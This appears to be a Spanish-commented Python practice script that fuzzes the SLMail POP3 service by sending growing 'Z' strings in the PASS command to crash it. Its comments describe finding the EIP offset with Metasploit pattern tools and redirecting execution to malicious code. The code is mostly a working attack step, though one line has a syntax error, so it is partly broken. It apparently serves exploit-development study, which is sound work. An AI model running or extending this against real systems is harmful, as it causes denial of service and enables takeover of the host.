#!/usr/bin/python
#coding: utf-8

# script para practicar buffer overflow a la app service SLMail

from pwn import *
import socket, sys

if len(sys.argv) < 2:
    print("\n[*] Uso: python " + sys.argv[0] + " <ip-address>\n")
    sys.exit(0) 

# variables globales
ip_address = sys.argv[1]
rport = 110 # telnet


if __name__ == '__main__':
    
    buffer = ["Z"] 
    cont = 100

    while len(buffer) < 32:
        """
        ['Z', 'Z*350', 'Z*700'] -> En la primera pos del array habría una Z, en la segunda 350 y así...
        """
        buffer.append("Z"*cont) 
        cont += 350 # voy aumentando de a 350 el contador

        
"""     
        Nos podemos apoyar de la herramienta patter_create.rb para crear caracteres aleatorios, 
        una vez que le mandemos esos bytes se va a generar un nro de registro EIP. 
        Y para calcular el offset le pasamos el valor eip que se generó("39694438")  
        El offset que es el valor final antes de sobreescribir el EIP es decir el valor limite antes de llegar a sobreescribir el EIP
        
        buffer = "A"*2606 + "B"*4  donde B*4 es el nuevo valor que va a tomar el registro EIP. Es decir a donde queremos que apunte el registro.

        /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700 -> me genera 2700 caracteres

        /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39694438 -> me detecta el offset necesario para tomar control del EIP
"""



    p1 = log.progress("Data")

    for strings in buffer: 
        """
        Por cada vez que me vaya recorriendo un elemento del array buffer voy a entablar un socket
        """
        try:
            p1.status("Enviando %s bytes " %s len(strings))
            
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # s = descriptor de archivo
            s.connect((ip_address, rport)) # conexión

            data = s.recv(1024) # mostramos la respuesta de la conexión

            # Mandamos las credenciales de acceso
            s.send("USER juan\r\n")
            data = s.recv(1024)
            s.send("PASS %s\r\n" % strings) # acá es donde mandamos las Zetas para hacer desbordamiento de buffer
            data = s.recv(1024)

            # La idea es verificar en qué rango se logra la denegación de servicio y se logra desbordar el buffer, luego debemos lograr tomar control del EIP y apuntarlo a otra dirección donde nosotros vamos a indicarle las intrucciones maliciosas a bajo nivel.

        except:
            print("\n[!] Ups, ha ocurrido un error de conexión! \n")
            sys.exit(1)
